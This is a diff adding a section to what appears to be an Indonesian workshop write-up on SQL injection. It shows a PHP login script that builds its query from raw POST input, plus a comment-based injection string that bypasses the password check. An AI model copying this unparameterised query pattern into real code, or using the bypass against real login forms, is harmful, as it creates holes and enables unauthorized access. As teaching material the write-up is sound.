@@ -92,5 +92,43 @@ zit@mingath:~$ code . MiniGathering0x22.md
 ![](0x22/3.png)
 > * ### Login dengan Injeksi SQL
 ![](0x22/4.png)
+> * ### POC? 
+```php
+<?php
+session_start();
+include './skumpar/koneksi.php';
+include('./skumpar/notif.php');
+$user = $_POST['nama'];
+$pass = $_POST['pass'];
+
+$login = mysqli_query($koneksi,"select * from admin where nama='$user' and pass='$pass'");
+$cek = mysqli_num_rows($login);
+if($cek > 0){
+$sesi = mysqli_query($koneksi,"select * from admin where nama='$user' and pass='$pass'");
+$sesi = mysqli_fetch_assoc($sesi);
+	$_SESSION['id'] = $sesi['id_admin'];
+	$_SESSION['nama'] = $sesi['nama'];
+	$_SESSION['status'] = "login";
+	header("location:muacch/");
+}else{
+	header("location:index.php?pesan=gagal");
+}
+
+?>
+
+```
+> __Note__
+> 
+> Query SQL
+```sql
+-- Normal Query
+SELECT * FROM admin WHERE nama='admin' AND pass='0x22'
+```
+![](0x22/5.png)
+```sql
+-- Injeksi Query
+SELECT * FROM admin WHERE nama='admin'--{spasi}' AND pass='hacker'
+```
+![](0x22/6.png)
 ![](?bgColor=!white)
 ![](?bgColor=!white)
